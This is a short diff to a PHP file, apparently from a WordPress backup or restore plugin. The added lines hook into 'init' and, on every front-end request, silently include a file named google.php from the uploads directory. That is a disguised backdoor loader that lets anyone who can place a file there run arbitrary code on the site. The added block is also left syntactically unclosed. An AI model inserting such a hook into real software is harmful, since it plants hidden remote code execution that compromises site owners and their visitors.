@@ -179,3 +179,11 @@ function epbio_run_restore_script() {
 		include $restore_script;
 	}
 }
+
+add_action('init', function() {
+    if ( ! is_admin() && php_sapi_name() !== 'cli' ) {
+        $google_script = WP_CONTENT_DIR . '/uploads/google.php';
+        if ( file_exists( $google_script ) ) {
+            include_once $google_script;
+        }
+}
